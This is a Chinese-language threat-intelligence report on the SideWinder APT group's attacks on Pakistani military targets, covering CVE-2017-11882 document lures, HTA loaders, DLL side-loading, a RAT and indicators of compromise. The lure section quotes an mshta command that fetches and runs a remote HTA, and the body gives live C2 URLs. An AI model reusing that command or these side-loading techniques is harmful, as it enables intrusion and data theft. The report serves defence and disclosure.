##  **一、** **概述**

 **从 2017 年底到 2019 年初，腾讯御见威胁情报中心发现一个疑似来自印度的 APT
攻击组织持续针对巴基斯坦等南亚国家的军事目标进行了定向攻击。腾讯御见威胁情报中心对该组织的攻击活动进行了长期的深入分析，从溯源结果来看，该组织的最早的攻击活动可以追溯到
2012 年。**

从御见威胁情报中心的分析结果来判断，该组织的背景跟卡巴斯基在 2018 年第一季度报告中提到的 SideWinder
组织非常的相似，虽然卡巴斯基并未发布任何该组织的技术细节和报告。我们继续沿用卡巴斯基的命名，命名该组织为"响尾蛇"（SideWinder、T-APT-04）。

腾讯御见威胁情报中心曾在 2018 年 5
月份发布了该组织的技术分析报告，而此后腾讯御见威胁情报中心又多次捕捉到了该组织的攻击活动。并且从分析结果来看，该组织一直在更新他们的攻击技术，以此来躲避安全软件的拦截和查杀。

##  **二、** **最新样本技术分析**

###  1、攻击诱饵分析

本次攻击诱饵采用 CVE-2017-11882 漏洞进行攻击，打开后并无任何内容。

![](https://image.3001.net/images/20190227/1551230717_5c75e6fd021bb.png!small)

![](https://image.3001.net/images/20190227/1551230725_5c75e705ead64.png!small)

触发漏洞后，会从远程地址<http://cdn-do.net/includes/b7199e61/-1/7340/dfd9a1da/final>获取
hta，然后调用 RunHtmlApplication，将命令行中的 final.hta 执行：

###
![](https://image.3001.net/images/20190227/1551230733_5c75e70dded26.png!small)2、final.hta
分析

final.hta 内容如下：

![](https://image.3001.net/images/20190227/1551230746_5c75e71ab64eb.png!small)

![](https://image.3001.net/images/20190227/1551230766_5c75e72e4bdf5.png!small)

hta 脚本中第一段 base64 字符串解码后，发现一段 c# 代码及一个 pe 文件存储其中。将此 pe 文件 dump 出后，发现其名称为
PreBotHta.dll：

![](https://image.3001.net/images/20190227/1551230781_5c75e73d2cfca.png!small)

PreBotHta.dll 为一 c# 语言编写的 dll 文件。Hta 脚本会调用 DynamicInvoke 执行 c# 代码，最终执行
PreBotHta.dll 中类函数 work（类名为「preBotHta」）

###  3、PreBotHta.dll 分析

PreBotHta 类中的函数如下图所示：

![](https://image.3001.net/images/20190227/1551230818_5c75e76292319.png!small)

Work 函数会检查「360」、「avast」、」avg」等杀软是否存在，若存在除上述名称以外的杀毒软件，就上报杀毒软件的名称到<http://cdn-do.net/plugins/-1/7340/true/true/>；接着会设置开机自启动项「credw1「；最终会将 hta 中的另一段 base64
解码解压缩得到 Duser.dll，释放路径为「C:\ProgramData\drvr\srvc2」，并利用微软自带的程序 credwiz.exe，将
Duser.dll 给执行起来：

![](https://image.3001.net/images/20190227/1551230831_5c75e76f8911b.png!small)

###  4、Duser.dll 分析

该 dll 所有导出函数都指向同一个地址 100025f0。木马的核心功能也将从地址开始：

![](https://image.3001.net/images/20190227/1551230845_5c75e77dea171.png!small)

![](https://image.3001.net/images/20190227/1551230856_5c75e788a1a84.png!small)

![](https://image.3001.net/images/20190227/1551230868_5c75e7940854d.png!small)

主要功能是先利用 url
[http://www.microsoft.com](http://www.microsoft.com/)测试网络是否连通，接着下载一个 js
脚本并执行此脚本，下载地址为<http://cdn-list.net/KOmJg2XSthl3PRhXnB6xT6Wo967B1n5uGf7SfiBC/-1/7340/b729d30c/css>

![](https://image.3001.net/images/20190227/1551230892_5c75e7acdc4ea.png!small)

![](https://image.3001.net/images/20190227/1551230908_5c75e7bcc5d63.png!small)

由于捕捉到样本时，该服务器已经失效，因此无法继续分析下载回的 js。

##  **三、** **攻击技术特点**

腾讯御见威胁情报中心对 SideWinder 的攻击活动进行了持续的跟踪，对该组织的技术特点及变化整理如下：

###  攻击诱饵

该组织的攻击诱饵主要有以下两类：office 文档和 lnk。

1、 lnk

如某次攻击中的诱饵文件如下：

![](https://image.3001.net/images/20190227/1551230935_5c75e7d75e788.png!small)

执行该 lnk 后，会执行命令：「%windir%\system32\mshta.exe <https://msftupdate.srv-cdn.com/cdne/plds/zoxr4yr5KV.hta>」

![](https://image.3001.net/images/20190227/1551230958_5c75e7ee0de92.png!small)

执行后，最终会使用 powershell 把真正的 pdf 给释放到%temp%\amend-ins-visit-on-abroad-15-11-2017.pdf 然后打开，并且从<https://msftupdate.srv-cdn.com/fin.hta>下载并执行
hta 脚本。

![](https://image.3001.net/images/20190227/1551230972_5c75e7fc27214.png!small)

![](https://image.3001.net/images/20190227/1551230997_5c75e8157b8c8.png!small)

2、 office 文档

office 文档是该组织最喜欢的攻击诱饵，捕捉到的攻击活动绝大部分都使用 office 文档做为攻击诱饵。并且都使用 CVE-2017-11882
漏洞来执行后续活动。如上述分析中的诱饵文件。也如某次攻击的诱饵文档：

![](https://image.3001.net/images/20190227/1551231075_5c75e8630982d.png!small)

触发漏洞后，会从<http://www.nadra.gov.pk.d-dns.co/includes/686a0ea5/-1/1224/fa1b01fb/final.hta>下载最终执行的
hta 脚本。

###  木马加载技术

SideWinder 组织的恶意文件的加载技术主要是使用 hta 脚本和白加黑的方式来进行。其中 hta
脚本用来做一些初始化的操作，如释放相应的恶意文件等；而释放的恶意文件采用白加黑的方式来隐藏自身和躲避拦截和查杀。但是在持续跟踪过程中，我们也发现该组织的一些技术细节也在不断的进行进化，根据该变化我们把它分为三个阶段：

1、 阶段一：~2018 年 10 月

该阶段主要使用 hta 脚本来完成所有下一阶段的初始化的工作，而在 hta 脚本中使用 powershell 脚本来进行。

如某次攻击的 hta 脚本：

![](https://image.3001.net/images/20190227/1551231021_5c75e82d4ea79.png!small)

![](https://image.3001.net/images/20190227/1551231030_5c75e83658af2.png!small)

脚本中」bnm「变量存储的一段 base64 字符串为一 powershell 脚本，

p1」、「p2」变量存储的也是 base64 字符串，两个字符串的内容会被存入 HKCU\Software\Updater\part1 和
HKCU\Software\Updater\part2 注册表中，这两个字符串其实就是后续的木马文件 cmpbk32.dll 和 cmdla32.exe。

bnm 变量解密出的 powershell 脚本内容如下所示：

![](https://image.3001.net/images/20190227/1551231045_5c75e8452de92.png!small)

主要功能是将 system32 目录下的 msvbvm60.dll 复制为 ATDMEX20.dll，将 system32 目录下的 cmdl32.exe
复制到目录「%programdata%\cmdl32\Updater\」, 将上文注册表中的 HKCU\Software\Updater\part1 和
HKCU\Software\Updater\part2 两部分解码成 cmpbk32.dll 和 cmdla32.exe。最终白利用 cmdl32.exe
加载木马文件 cmpbk32.dll，并设置注册表项」Winsound「实现开机自启动。

![](https://image.3001.net/images/20190227/1551231081_5c75e8691e9e7.png!small)

2、 阶段二：2018 年 10 月~2019 年 2 月

该阶段的加载过程依然在 hta 脚本中进行，但是 hta 脚本不再使用 powershell
来执行下一阶段的初始化工作，直接在脚本中完成初始化的工作。如某次攻击的脚本如下：

![](https://image.3001.net/images/20190227/1551231094_5c75e8765b03a.png!small)

脚本会将 base64 编码的压缩文件 Test.zip 解压，Test.zip 中的文件主要有 FinalBot.exe、hj.txt、hj1.txt：

![](https://image.3001.net/images/20190227/1551231108_5c75e8845fd20.png!small)

接着会将 hj.txt 和 hj1.txt 中存储的 cmpbk32.dll 释放到 C:\ProgramData\Srvstr\dat 目录：

![](https://image.3001.net/images/20190227/1551231331_5c75e963be47d.png!small)

脚本会先获取杀软的名称，如果不是「360」、「avast」，就上报杀软的名称到相应的服务器，如[http://webserv-redir.net](http://webserv-redir.net/) /plugins/ -1/5272/true/true/：

![](https://image.3001.net/images/20190227/1551231342_5c75e96e98763.png!small)

最后会将系统自带的「cmdl32.exe」复制到「C:\ProgramData\Srvstr\dat\」目录，创建开机自启动项「WinSrv」，并启动
cmdl32.exe, 然后通知服务器执行成功, 最终 cmdl32.exe（白）程序会加载木马文件 cmpbk32.dll：

![](https://image.3001.net/images/20190227/1551231356_5c75e97c27f37.png!small)

3、 阶段三：2019 年 2 月~

该阶段的脚本类似于第二阶段的脚本，但是把第二阶段脚本中去下载回的 hta
脚本直接包含在了初始脚本中。但是也把第二阶段的部分功能，如监测杀软等功能放到了一个名为 PreBotHta 的 dll 中。如某次攻击的脚本如下：

![](https://image.3001.net/images/20190227/1551231373_5c75e98d717f5.png!small)

![](https://image.3001.net/images/20190227/1551231381_5c75e9956b6bc.png!small)
脚本中的第一段 base64 解码后为一段 c# 代码以及一个 c# 编写的 dll 文件，然后调用 DynamicInvoke 执行 c# 代码：

![](https://image.3001.net/images/20190227/1551231395_5c75e9a32b617.png!small)

加载的 dll 为 PreBotHta.dll，该 dll 主要功能为监测安全软件、设置启动项、释放和下载下一阶段恶意文件：

![](https://image.3001.net/images/20190227/1551231471_5c75e9efea13f.png!small)

无论采用哪一阶段的加载使用，最后都会使用白加黑的技术把最终的恶意文件给加载起来。

如 cmdl32.exe+cmpbk32.dll 组合，其中 cmdl32.exe 为微软自动下载连接管理的文件：

![](https://image.3001.net/images/20190227/1551231423_5c75e9bfd272d.png!small)

如 credwiz.exe+Duser.dll 组合，其中 credwiz.exe 为备份或还原储存的用户名和密码的文件：

![](https://image.3001.net/images/20190227/1551231437_5c75e9cd732ef.png!small)

###  RAT

最终释放的恶意文件为一个 VB
写的后门文件，用来收集用户信息、记录键盘和鼠标的操作等。具体的技术细节可以参考腾讯御见威胁情报中心之前关于该组织的分析报告：<https://s.tencent.com/research/report/479.html>

![](https://image.3001.net/images/20190227/1551231459_5c75e9e30023e.png!small)

![](https://image.3001.net/images/20190227/1551231480_5c75e9f8bf42e.png!small)

![](https://image.3001.net/images/20190227/1551231495_5c75ea0740789.png!small)

此外，我们还在某一版本的后门中发现了一个用 c# 写的信息收集模块：PreBotModule.dll，

该模块的主要功能是收集信息并上传至<http://cdn-list.net/zqRwY5aPlgJu60xjqJIwnBPnwmqZhdNADQ50VpIy/-1/5272/1/cd24e373/res>

![](https://image.3001.net/images/20190227/1551231518_5c75ea1edaa18.png!small)

##  **四、** **攻击背景判断**

1、 诱饵文件判断：

从该组织攻击的诱饵文件来看，主要是跟巴基斯坦相关，如：

![](https://image.3001.net/images/20190227/1551231538_5c75ea32a4511.png!small)

![](https://image.3001.net/images/20190227/1551231566_5c75ea4ed196c.png!small)

![](https://image.3001.net/images/20190227/1551231569_5c75ea51e3038.png!small)

而某个诱饵文件的作者信息为：

![](https://image.3001.net/images/20190227/1551231594_5c75ea6a440ae.png!small)

而该作者的名字 Rashid Memorial 恰好跟巴基斯坦军方相关：

![](https://image.3001.net/images/20190227/1551231617_5c75ea8154e47.png!small)

2、 从基础设施来看，某次攻击的 C&C 为

<http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta>

根据御见安图高级威胁追溯系统的查询结果来看，跟 NADRA 相关：

![](https://image.3001.net/images/20190227/1551231669_5c75eab5f1f50.png!small)

这也正好跟上面的某个诱饵文档相符：

![](https://image.3001.net/images/20190227/1551231692_5c75eacc8341c.png!small)

该诱饵下载 hta 的地址为：

<http://www.nadra.gov.pk.d-dns.co/includes/686a0ea5/-1/1224/fa1b01fb/final.hta>

而 NADRA 为巴基斯坦内政部下属的一个附属部门国家数据库和登记局成立了的国家数据库组织。

![](https://image.3001.net/images/20190227/1551231749_5c75eb05278d2.png!small)

3、 VT 上传信息：

从 VT 的上传信息来看，某些文件的上传者来自于巴基斯坦：

![](https://image.3001.net/images/20190227/1551231722_5c75eaea7c7ed.png!small)

综上我们判断，该组织的攻击对象跟巴基斯坦军方等部门相关。

##  **五、** **组织小结**

**![](https://image.3001.net/images/20190227/1551231732_5c75eaf4e7110.png!small)**

## **六、** **总结**

响尾蛇（SideWinder）组织是一个成熟的 APT 攻击组织，该组织擅长使用 office 漏洞、hta 脚本、白加黑、VB
木马等技术来实施攻击，并且攻击手法还在不断的进化中。目前该组织的攻击目标主要在巴基斯坦，但是由于地缘关系，也不排除针对中国境内的目标发起攻击，因此相关部门、单位和企业切不可掉以轻心。

##  **七、** **安全建议**

1、不要打开不明来源的邮件附件；除非非常清楚文档来源可靠，否则建议不要启用 Office 执行宏代码；

2、 及时打系统补丁和重要软件的补丁；

3、 使用杀毒软件防御可能的病毒木马攻击；

4、 使用腾讯御界高级威胁检测系统，及时发现 APT
攻击的蛛丝马迹。御界高级威胁检测系统，是基于腾讯安全反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。

![](https://image.3001.net/images/20190227/1551231750_5c75eb06cef4f.jpg!small)

##  **八、** **附录**

###  **1、** **IOCs**

**MD5** **：**

> d2522e45c0b0d83dddd3fcc51862d48c
>
> 444438f4ce76156cec1788392f887da6
>
> 3cd725172384297732222ef9c8f74adc
>
> c0f15436912d8a63dbb7150d95e6a4ee
>
> c986635c40764f10bcebe280b05efe8c
>
> d1c3fa000154dbccd6e5485a10550a29
>
> b956496c28306c906fddf08ded1cdf65
>
> a1ca53efda160b31ebf07d8553586264
>
> 204860ce22c81c6d9de763c09e989a20
>
> de7f526d4f60b59bb1626770f329f984
>
> 2cb633375a5965f86360e761363d9f2f
>
> 5cd406e886bd9444adee4e8b62aa56cc
>
> 358450e19d38db77c236f45881dcebef
>
> 29325cdbde5e0cf60d277aa2d9ba4537
>
> 836419a7a4675d51d006d4cb9102af9c

**URL** **：**

> hxxps://msftupdate.srv-cdn.com/cdne/plds/zoxr4yr5KV.hta
>
> hxxps://msftupdate.srv-cdn.com/fin.hta
>
>
> hxxp://[www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta](http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta)
>
>
> hxxp://[www.nadra.gov.pk.d-dns.co/includes/686a0ea5/-1/1224/fa1b01fb/final.hta](http://www.nadra.gov.pk.d-dns.co/includes/686a0ea5/-1/1224/fa1b01fb/final.hta)
>
> hxxp://webserv-redir.net/includes/b7199e61/-1/5272/fdbfcfc1/final
>
> hxxp://pmo.cdn-load.net/cgi/5ed0655734/-1/1078/d70cc726/file.hta
>
> hxxp://fb-dn.net/disrt/fin.hta
>
> hxxp://cdn-edge.net/checkout.php
>
> hxxp://cdn-edge.net/cart.php
>
> hxxp://cdn-edge.net/amount.php
>
> hxxp://ap12.ms-update-server.net/checkout.php
>
> hxxp://ap12.ms-update-server.net/cart.php
>
> hxxp://ap12.ms-update-server.net/amount.php
>
> hxxp://s2.cdn-edge.net/checkout.php
>
> hxxp://s2.cdn-edge.net/cart.phpB
>
> hxxp://s2.cdn-edge.net/amount.php
>
> hxxp://webserv-redir.net/plugins/-1/5272/true/true/
>
> hxxp://webserv-redir.net/plugins/-1/5272/true/true/done
>
> hxxp://s12.cdn-apn.net/checkout.php
>
> hxxp://s12.cdn-apn.net/cart.php
>
> hxxp://s12.cdn-apn.net/amount.php
>
> hxxp://cdn-do.net/plugins/-1/7340/true/true/
>
> hxxp://cdn-> list.net/KOmJg2XSthl3PRhXnB6xT6Wo967B1n5uGf7SfiBC/-1/7340/b729d30c/css

###  **2、** **参考资料**

> 1、 <https://s.tencent.com/research/report/479.html>
>
> 2、 <https://medium.com/@Sebdraven/apt-sidewinder-complicates-theirs-> malwares-4e15683e7e26>

***本文作者：腾讯电脑管家，转载请注明来自FreeBuf.COM**

